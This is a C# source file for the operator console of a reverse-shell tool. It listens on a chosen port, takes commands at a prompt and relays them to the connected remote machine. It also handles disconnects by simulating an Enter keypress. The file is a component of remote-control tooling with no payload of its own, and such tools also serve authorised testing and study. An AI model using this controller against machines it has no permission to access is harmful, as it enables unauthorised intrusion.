using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Commands;
using NetworkManager;
using Shared;

namespace ReverseShellClient
{
    public class ClientManager
    {
        bool waitingForUserInput { get; set; } = false;


        public ClientManager()
        {
            Console.ForegroundColor = ConsoleColor.Green;
        }


        public void Start()
        {
            DisplayBanner();

            var listen = true;

            while (listen)
            {
                Console.Write(@"Please type a port number to listen to : ");
                var port = 0;
                while (port == 0)
                {
                    try
                    {
                        port = int.Parse(Console.ReadLine());
                        if(port < 1 || port > 65535)
                            throw new ArgumentException();
                    }
                    catch (Exception)
                    {
                        Console.Write("This is not a valid port, please type again\n>");
                    }
                }

                // Listen and start connection
                GlobalNetworkManager.clientNetworkManager.ListenAndConnect(port);

                // Check if the connection is still active in the background
                var connectionMonitoringTask = new Task(MonitorConnection);
                connectionMonitoringTask.Start();

                // Process user input
                RunClient();
                
                // Connection ended, ask listen again
                listen = AskListenAgain();
            }
        }


        void MonitorConnection()
        {
            while (true)
            {
                // The program is waiting for the user to enter a command, but the other end of the connection disconnected
                if (waitingForUserInput && !GlobalNetworkManager.clientNetworkManager.IsConnected())
                {
                    // Call cleanup method from ClientNetworkManager
                    GlobalNetworkManager.clientNetworkManager.Cleanup(processingCommand: false);
                    
                    // Send [ENTER] key to bypass the console.ReadLine()
                    var hWnd = Process.GetCurrentProcess().MainWindowHandle;
                    PostMessage(hWnd, WM_KEYDOWN, VK_RETURN, 0);

                    break;
                }

                // The program executed a method, but the other end of the connection disconnected, this was caught and the cleanup method was called was made
                if (!waitingForUserInput && GlobalNetworkManager.clientNetworkManager.CleanupMade())
                {
                    break;
                }

                // The other of the connection is still connected, wait and try again
                Thread.Sleep(1000);
            }
        }

        

        /*void ProcessIncomingData()
        {
            while (true)
            {
                try
                {
                    var data = GlobalNetworkManager.ReadLine();
                    if (data == null)
                    {
                        continue;
                    }// to remove ??

                    var command = CommandsManager.GetCommandByFlag(data);
                    if (command != null)
                    {
                        // Call client method
                        command.ClientMethod(null);
                        command.savedData?.Clear();
                        processingCommand = false;
                    }
                    else
                    {
                        // Normal output (text)
                        // Check if the line isn't the one representing the path in the cmd
                        if (data.Length > 0 && !(data[data.Length - 1] == '>' && data.Contains(@":\")))
                        {
                            // Add line return
                            Console.WriteLine(data);
                        }
                        else
                        {
                            // Display cmd path without line return
                            Console.Write(data);
                        }
                    }
                }
                catch (Exception)
                {
                    // An exception will be catched if the client used the "exit" command, the cleanup is already done
                    if (GlobalNetworkManager.clientNetworkManager.IsConnected())
                    {
                        Cleanup(false);
                    }
                    
                    break;
                }
            }
        }*/


        void RunClient()
        {
            DisplayCommandPrompt();

            while (true)
            {
                waitingForUserInput = true;     // Used for the connectionMonitoringTask
                var commandString = Console.ReadLine();
                waitingForUserInput = false;

                // If the connection was closed, break from the loop
                if (!GlobalNetworkManager.clientNetworkManager.IsConnected())
                {
                    break;
                }


                if (commandString == "clear" || commandString == "cls")
                {
                    // Clear console
                    Console.Clear();
                }
                else if (commandString == "help")
                {
                    // Global help section
                    CommandsManager.ShowGlobalHelp();
                }
                else if (commandString != "")
                {
                    var splittedCommand = CommandsManager.GetSplittedCommand(commandString);
                    var commandName = splittedCommand[0];

                    ICommand command = CommandsManager.GetCommandByName(commandName);
                    if (command != null)
                    {
                        var arguments = new List<string>();

                        if (splittedCommand.Count > 1)
                        {
                            arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
                        }


                        if (arguments.Count == 1 && arguments[0] == "help")
                        {
                            // Display command's help
                            CommandsManager.ShowCommandHelp(command);

                            DisplayCommandPrompt();
                            continue;
                        }


                        if (!CommandsManager.CheckCommandSyntax(command, arguments))
                        {
                            ColorTools.WriteCommandError(
                                $"Syntax error, check out the command's help page ({commandName} help)");

                            DisplayCommandPrompt();
                            continue;
                        }


                        var preProcessResult = true;
                        try
                        {
                            preProcessResult = command.PreProcessCommand(arguments);
                        }
                        catch (NotImplementedException)
                        {
                            // Ignored
                        }

                        if (preProcessResult == false)
                        {
                            // Error in the PreProcess method
                            DisplayCommandPrompt();
                            continue;
                        }


                        try
                        {
                            if (!command.isLocal)
                            {
                                // Send the command to the server
                                GlobalNetworkManager.WriteLine(commandString);
                            }

                            command.ClientMethod(arguments);
                        }
                        catch (ExitException)
                        {
                            // The client called the 'Exit' or 'Terminate' command
                            Cleanup(isCommandProcessing: false);
                            break;
                        }
                        catch (IOException)
                        {
                            // Most likely the server disconnected, or a command didn't catch its exception...
                            Cleanup(isCommandProcessing: true);
                            break;
                        }
                    }
                    else
                    {
                        ColorTools.WriteError($"'{commandName}' is not a known command");
                    }
                }

                DisplayCommandPrompt();
            }
        }


        bool AskListenAgain()
        {
            Console.Write("Listen again ? (y/N) ");
            var input = Console.ReadLine();
            Console.Clear();

            return input == "y" || input == "Y";
        }


        void Cleanup(bool isCommandProcessing)
        {
            try
            {
                GlobalNetworkManager.clientNetworkManager.Cleanup(isCommandProcessing);
            }
            catch (Exception)
            {
                // Ignored
            }
        }


        void DisplayBanner()
        {
            Console.WriteLine(" _____ _     _       _      _     _             _       \n|     |_|___| |_ ___| |   _| |___| |___ ___ ___| |_ ___ \n| | | | |  _|   | -_| |  | . | -_| | . | -_|  _|   | -_|\n|_|_|_|_|___|_|_|___|_|  |___|___|_|  _|___|___|_|_|___|\n                                   |_|                  \n\n");
        }


        void DisplayCommandPrompt() => Console.Write("test>");


        #region Simulate user input

        [DllImport("User32.Dll", EntryPoint = "PostMessageA")]
        static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);

        const int VK_RETURN = 0x0D;
        const int WM_KEYDOWN = 0x100;

        #endregion Simulate user input
    }
}
